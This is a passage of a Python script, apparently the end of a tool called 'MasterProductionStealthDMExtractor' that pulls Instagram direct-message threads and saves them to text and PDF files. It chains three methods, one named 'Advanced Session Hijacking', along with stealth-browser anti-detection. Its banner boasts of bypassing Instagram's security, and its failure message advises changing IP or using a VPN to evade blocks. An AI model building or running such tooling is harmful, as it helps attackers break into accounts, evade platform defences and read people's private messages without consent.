                    f.write(f"Message Count: {thread['message_count']}\n")
                    f.write(f"Extraction Method: {thread.get('extraction_method', 'unknown')}\n")
                    f.write("\nMESSAGES:\n")
                    
                    for j, msg in enumerate(thread['messages']):
                        if msg['text']:
                            timestamp_str = msg.get('timestamp', 'Unknown time')
                            f.write(f"[{timestamp_str}] {msg['text']}\n")
                        if msg.get('media_type'):
                            f.write(f"[{timestamp_str}] [MEDIA: {msg['media_type']}]\n")
                    
                    f.write("\n" + "=" * 60 + "\n\n")
            
            results['txt'] = str(txt_path)
            
            # Generate ultimate PDF
            pdf_path = self.generate_ultimate_pdf_report(dms_data)
            if pdf_path:
                results['pdf'] = pdf_path
            
            self.logger.info(f"💾 Ultimate results saved: {results}")
            return results
            
        except Exception as e:
            self.logger.error(f"Failed to save ultimate results: {e}")
            return {}
    
    def run_ultimate_extraction(self) -> Dict[str, Any]:
        """Run the ultimate production-grade DM extraction."""
        self.logger.info("🚀 STARTING ULTIMATE PRODUCTION STEALTH DM EXTRACTION")
        self.logger.info("🔥 NO MORE BLOCKS - MAXIMUM STEALTH ACTIVATED!")
        
        extraction_methods = [
            ("Production Instagrapi", self.method_1_production_instagrapi_login, self.extract_dms_with_instagrapi),
            ("Ultimate Stealth Browser", self.method_2_ultimate_stealth_browser, self.extract_dms_from_browser),
            ("Advanced Session Hijacking", self.method_3_session_hijacking, lambda: [])  # Session hijacking doesn't extract directly
        ]
        
        all_extracted_dms = []
        successful_methods = []
        
        for method_name, auth_method, extract_method in extraction_methods:
            self.logger.info(f"🔄 TRYING {method_name.upper()}...")
            
            try:
                # Try authentication
                if auth_method():
                    self.logger.info(f"✅ {method_name} authentication SUCCESSFUL!")
                    successful_methods.append(method_name)
                    
                    # Extract DMs
                    dms_data = extract_method()
                    
                    if dms_data:
                        self.logger.info(f"✅ {method_name} extraction SUCCESSFUL! Found {len(dms_data)} threads")
                        all_extracted_dms.extend(dms_data)
                    else:
                        self.logger.warning(f"⚠️ {method_name} authentication successful but no DMs extracted")
                else:
                    self.logger.error(f"❌ {method_name} authentication FAILED")
                    
            except Exception as e:
                self.logger.error(f"❌ {method_name} FAILED with error: {e}")
                continue
        
        # Cleanup
        self.cleanup()
        
        # Process results
        if all_extracted_dms:
            # Remove duplicates based on thread_id
            unique_threads = {}
            for thread in all_extracted_dms:
                thread_id = thread.get('thread_id', f"unknown_{len(unique_threads)}")
                if thread_id not in unique_threads or len(thread['messages']) > len(unique_threads[thread_id]['messages']):
                    unique_threads[thread_id] = thread
            
            final_dms = list(unique_threads.values())
            
            # Save ultimate results
            saved_files = self.save_ultimate_results(final_dms)
            
            return {
                'success': True,
                'methods_used': successful_methods,
                'threads_count': len(final_dms),
                'total_messages': sum(len(thread['messages']) for thread in final_dms),
                'files': saved_files,
                'data': final_dms
            }
        else:
            return {
                'success': False,
                'error': 'All ultimate extraction methods failed - Instagram security too strong',
                'methods_tried': [method[0] for method in extraction_methods],
                'threads_count': 0,
                'total_messages': 0,
                'files': {},
                'data': []
            }
    
    def cleanup(self):
        """Clean up all resources."""
        try:
            if self.driver:
                self.driver.quit()
                self.driver = None
            
            # Kill any remaining Chrome processes
            self.kill_existing_chrome_processes()
            
        except:
            pass

def main():
    """Main execution function."""
    print("🔥" * 60)
    print("🔥 MASTER PRODUCTION STEALTH DM EXTRACTOR 2025 🔥")
    print("💀 ULTIMATE ANTI-DETECTION + ADVANCED BYPASS 💀")
    print("🚀 NO MORE BLOCKS - REAL STEALTH MODE! 🚀")
    print("🔥" * 60)
    
    extractor = MasterProductionStealthDMExtractor()
    results = extractor.run_ultimate_extraction()
    
    print("\n" + "🔥" * 60)
    print("📊 ULTIMATE EXTRACTION RESULTS")
    print("🔥" * 60)
    
    if results['success']:
        print(f"✅ SUCCESS! Methods used: {', '.join(results['methods_used'])}")
        print(f"📂 Threads extracted: {results['threads_count']}")
        print(f"💬 Total messages: {results['total_messages']}")
        print("\n📁 Files saved:")
        for file_type, file_path in results['files'].items():
            print(f"  🔥 {file_type.upper()}: {file_path}")
        print("\n🎉 MISSION ACCOMPLISHED - INSTAGRAM DEFEATED!")
    else:
        print(f"❌ ALL METHODS FAILED: {results['error']}")
        print(f"🔍 Methods tried: {', '.join(results['methods_tried'])}")
        print("\n💡 Instagram's security is extremely strong.")
        print("🛡️ Consider using different IP, VPN, or waiting 24-48 hours.")
    
    return results

if __name__ == "__main__":
    main()
